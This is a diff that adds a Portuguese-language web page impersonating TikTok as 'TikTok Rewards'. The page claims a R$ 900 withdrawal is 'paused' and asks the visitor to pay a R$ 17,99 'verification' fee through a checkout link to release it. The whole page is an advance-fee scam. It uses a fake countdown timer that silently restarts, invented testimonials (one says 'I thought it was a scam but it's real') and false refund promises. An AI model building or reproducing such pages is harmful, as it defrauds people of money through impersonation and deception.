@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"/>
+<title>Saque Pausado | TikTok Rewards</title>
+<meta name="theme-color" content="#ff0050"/>
+<meta name="description" content="Sua recompensa ainda está reservada. Conclua a verificação final para liberar o saque."/>
+<script src="/pix.js" defer></script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;min-height:100vh}
+  .wrap{max-width:430px;margin:0 auto;padding:0 16px 48px}
+  .topbar{background:linear-gradient(180deg,#3a0013 0%,rgba(58,0,19,0) 100%);padding:14px 0 26px;text-align:center;position:sticky;top:0;z-index:5;backdrop-filter:blur(2px)}
+  .expire{display:inline-flex;align-items:center;gap:8px;font-weight:800;font-size:14px;letter-spacing:.06em;color:#ff8fa8}
+  .expire svg{width:16px;height:16px}
+  .cd{background:#fff;color:#e60046;font-weight:900;border-radius:6px;padding:2px 8px;font-size:15px;font-variant-numeric:tabular-nums}
+  .logo{display:flex;justify-content:center;margin:26px 0 18px}
+  .logo svg{width:150px;height:38px}
+  .status{display:flex;align-items:center;justify-content:center;gap:10px;font-size:11px;font-weight:800;letter-spacing:.22em;color:#9aa0a6;margin-bottom:18px}
+  .dot{width:6px;height:6px;border-radius:50%}
+  .dot.r{background:#ff0050}.dot.c{background:#25f4ee}
+  h1{font-size:38px;font-weight:900;text-align:center;line-height:1.05;margin-bottom:14px}
+  h1 .grad{background:linear-gradient(180deg,#fff 0%,#666 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .sub{text-align:center;color:#c9cdd2;font-size:15px;line-height:1.45;margin-bottom:22px}
+  .hl{background:#ff0050;color:#fff;font-weight:800;border-radius:5px;padding:1px 6px;white-space:nowrap}
+  .card{background:#141416;border:1px solid #26262a;border-radius:18px;padding:16px;margin-bottom:14px}
+  .warn{display:flex;gap:14px;align-items:flex-start}
+  .warn .ico{flex:0 0 44px;height:44px;border-radius:12px;background:rgba(255,0,80,.12);border:1px solid rgba(255,0,80,.35);display:flex;align-items:center;justify-content:center}
+  .warn .ico svg{width:22px;height:22px}
+  .warn b{display:block;font-size:16px;margin-bottom:4px}
+  .warn p{color:#9aa0a6;font-size:13.5px;line-height:1.4}
+  .warn p b{display:inline;color:#fff;font-size:13.5px;margin:0}
+  .discount{text-align:center;padding:22px 16px}
+  .badge{display:inline-flex;align-items:center;gap:6px;background:rgba(37,244,238,.08);border:1px solid rgba(37,244,238,.35);color:#25f4ee;font-size:11px;font-weight:800;letter-spacing:.18em;border-radius:999px;padding:7px 14px;margin-bottom:18px}
+  .badge svg{width:13px;height:13px}
+  .from{color:#9aa0a6;font-size:15px}
+  .from s{color:#6b6f75}
+  .price{font-size:52px;font-weight:900;margin:4px 0 14px}
+  .save{display:inline-flex;align-items:center;gap:6px;background:rgba(255,0,80,.14);border:1px solid rgba(255,0,80,.5);color:#ff4d7e;font-weight:800;font-size:13px;border-radius:999px;padding:7px 14px}
+  .save svg{width:14px;height:14px}
+  .perks{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:14px}
+  .perk{background:#141416;border:1px solid #26262a;border-radius:14px;padding:14px 6px;text-align:center;font-size:11px;font-weight:700;color:#c9cdd2;line-height:1.35}
+  .perk svg{width:20px;height:20px;display:block;margin:0 auto 8px}
+  .perk b{color:#fff}
+  .social .head{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+  .social .head .n{display:flex;align-items:center;gap:7px;font-weight:800;font-size:14.5px}
+  .social .head .n svg{width:15px;height:15px}
+  .stars{color:#fbbf24;font-size:13px;letter-spacing:2px}
+  .stars span{color:#fff;font-weight:800;letter-spacing:0;margin-left:6px;font-size:13.5px}
+  .t{display:flex;gap:12px;padding:12px 0;border-top:1px solid #26262a}
+  .t:first-of-type{border-top:none;padding-top:0}
+  .ava{flex:0 0 44px;width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,#ff0050,#7a1fa2);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:16px;color:#fff}
+  .t .who{display:flex;align-items:center;gap:6px;font-weight:800;font-size:14.5px}
+  .t .who svg{width:14px;height:14px;flex:0 0 14px}
+  .t .who small{color:#6b6f75;font-weight:600;font-size:12px}
+  .t p{color:#c9cdd2;font-size:13.5px;font-style:italic;line-height:1.4;margin:3px 0 4px}
+  .t time{color:#6b6f75;font-size:12px}
+  .cta{display:block;width:100%;background:linear-gradient(180deg,#ff2d6f,#e60046);border:none;border-radius:16px;color:#fff;font-size:18px;font-weight:900;letter-spacing:.02em;padding:20px;cursor:pointer;box-shadow:0 10px 40px rgba(255,0,80,.45);margin:8px 0 14px}
+  .cta:active{transform:scale(.98)}
+  .refund{display:flex;justify-content:center;margin-bottom:26px}
+  .refund span{display:inline-flex;align-items:center;gap:7px;border:1px solid rgba(37,244,238,.45);color:#25f4ee;font-size:13px;font-weight:700;border-radius:999px;padding:9px 16px}
+  .refund svg{width:14px;height:14px}
+  .reg{text-align:center;font-size:11px;letter-spacing:.28em;color:#6b6f75;font-weight:800;margin-bottom:12px}
+  .seals{background:#fff;border-radius:14px;padding:16px;display:flex;justify-content:center;gap:26px;align-items:center}
+  .seals svg{height:34px;opacity:.85}
+  .foot{text-align:center;color:#4a4d52;font-size:11px;margin-top:22px;line-height:1.6}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <div class="expire">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#ff8fa8" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
+      A OFERTA EXPIRA EM <span class="cd" id="mm">04</span><span style="color:#fff">:</span><span class="cd" id="ss">55</span>
+    </div>
+  </div>
+
+  <div class="logo">
+    <svg viewBox="0 0 148 32" fill="#fff" aria-label="TikTok"><path d="M21.6 3.2c.5 3.4 2.6 6 6 6.4v4.4c-2.2 0-4.2-.7-6-1.9v7.5c0 5.1-3.8 8.5-8.4 8.5A8.1 8.1 0 0 1 5 19.6c0-4.9 3.9-8.4 8.9-8.2.4 0 .8 0 1.2.1v4.5c-.4-.1-.8-.2-1.3-.2a3.9 3.9 0 0 0-4 3.8c0 2.2 1.6 3.8 3.8 3.8 2.3 0 4-1.7 4-4.2V0h5c0 .3 0 .7 0 1 0 .8.1 1.5.5 2.2Z"/><text x="34" y="24" font-family="inherit" font-size="23" font-weight="800" letter-spacing="-0.5">TikTok</text></svg>
+  </div>
+
+  <div class="status"><span class="dot r"></span>SAQUE PAUSADO<span class="dot c"></span></div>
+
+  <h1>Ei,<br/><span class="grad">espera um segundo!</span></h1>
+  <p class="sub">Sua recompensa de <span class="hl">R$ 900,00</span> ainda está<br/>reservada por mais alguns minutos</p>
+
+  <div class="card warn">
+    <div class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="#ff4d7e" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div>
+    <div>
+      <b>Você está prestes a receber R$ 900,00</b>
+      <p>A verificação de segurança é a <b>etapa final</b> para liberar o seu saque.</p>
+    </div>
+  </div>
+
+  <div class="card discount">
+    <span class="badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>DESCONTO EXCLUSIVO</span>
+    <p class="from">De <s>R$ 37,12</s> por:</p>
+    <div class="price">R$ 17,99</div>
+    <span class="save"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 4.5 13.5H11L9.5 22 19 9.5h-6.5L13 2Z"/></svg>Economize R$ 19,13</span>
+  </div>
+
+  <div class="perks">
+    <div class="perk"><svg viewBox="0 0 24 24" fill="none" stroke="#25f4ee" stroke-width="2.2" stroke-linecap="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg><b>Pagamento</b><br/>seguro</div>
+    <div class="perk"><svg viewBox="0 0 24 24" fill="none" stroke="#ff0050" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"/><path d="m9 12 2 2 4-4"/></svg><b>100%</b><br/>reembolsável</div>
+    <div class="perk"><svg viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2.2" stroke-linejoin="round"><path d="M13 2 4.5 13.5H11L9.5 22 19 9.5h-6.5L13 2Z"/></svg><b>Liberação</b><br/>imediata</div>
+  </div>
+
+  <div class="card social">
+    <div class="head">
+      <div class="n"><svg viewBox="0 0 24 24" fill="#ff0050"><path d="M16.6 3c.4 2.3 1.9 4 4.4 4.2v3.1c-1.6 0-3-.5-4.4-1.3v6.4c0 4.1-2.8 6.6-6.5 6.6A6.3 6.3 0 0 1 3.8 15.7c0-3.7 3-6.4 6.8-6.3.3 0 .6 0 .9.1v3.3a3.2 3.2 0 0 0-1-.2 3.1 3.1 0 0 0-3.2 3.1c0 1.7 1.3 3 3 3 1.8 0 3.1-1.4 3.1-3.3V3h3.2Z"/></svg>+2.847 saques hoje</div>
+      <div class="stars">★★★★★<span>4.9</span></div>
+    </div>
+    <div class="t">
+      <div class="ava">BS</div>
+      <div>
+        <div class="who">Bruna Santos <svg viewBox="0 0 24 24" fill="#25f4ee"><path d="M12 1 15 4l4 .5 1 4 3 3-3 3-1 4-4 .5-3 3-3-3-4-.5-1-4-3-3 3-3 1-4 4-.5 3-3Z"/><path d="m9.5 12.5 2 2 3.5-4" stroke="#000" stroke-width="2" fill="none"/></svg><small>São Paulo, SP</small></div>
+        <p>"paguei a taxa e em segundos os R$ 900 caíram no meu Pix, eu chorei 😭💸"</p>
+        <time>8 min atrás</time>
+      </div>
+    </div>
+    <div class="t">
+      <div class="ava">TM</div>
+      <div>
+        <div class="who">Thiago Moraes <svg viewBox="0 0 24 24" fill="#25f4ee"><path d="M12 1 15 4l4 .5 1 4 3 3-3 3-1 4-4 .5-3 3-3-3-4-.5-1-4-3-3 3-3 1-4 4-.5 3-3Z"/><path d="m9.5 12.5 2 2 3.5-4" stroke="#000" stroke-width="2" fill="none"/></svg><small>Fortaleza, CE</small></div>
+        <p>"achei que era golpe mas é real, recebi cada centavo 🤝"</p>
+        <time>19 min atrás</time>
+      </div>
+    </div>
+    <div class="t">
+      <div class="ava">JV</div>
+      <div>
+        <div class="who">Julia Vieira <svg viewBox="0 0 24 24" fill="#25f4ee"><path d="M12 1 15 4l4 .5 1 4 3 3-3 3-1 4-4 .5-3 3-3-3-4-.5-1-4-3-3 3-3 1-4 4-.5 3-3Z"/><path d="m9.5 12.5 2 2 3.5-4" stroke="#000" stroke-width="2" fill="none"/></svg><small>Belo Horizonte, MG</small></div>
+        <p>"paguei a taxa de liberação e nem pensei duas vezes, o saque valeu muito a pena"</p>
+        <time>33 min atrás</time>
+      </div>
+    </div>
+  </div>
+
+  <button class="cta" id="go">LIBERAR R$ 900,00</button>
+  <div class="refund"><span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>Reembolso de R$ 17,99 em 1 minuto</span></div>
+
+  <p class="foot">© 2026 TikTok Rewards · Pagamento processado com segurança via Pix</p>
+</div>
+
+<script>
+(function(){
+  // countdown 04:55
+  var t = 4*60+55, mm = document.getElementById('mm'), ss = document.getElementById('ss');
+  function tick(){
+    var m = Math.floor(t/60), s = t%60;
+    mm.textContent = String(m).padStart(2,'0');
+    ss.textContent = String(s).padStart(2,'0');
+    if(t>0) t--; else t = 4*60+55;
+  }
+  tick(); setInterval(tick,1000);
+
+  // mantém UTMs ao voltar para o checkout
+  function qs(){ try{ return sessionStorage.getItem('utmq') || location.search || ''; }catch(e){ return location.search||''; } }
+  document.getElementById('go').addEventListener('click', function(){
+    var q = qs();
+    location.href = '/checkout/' + (q && q.charAt(0) !== '?' ? '?' + q : q);
+  });
+})();
+</script>
+</body>
+</html>
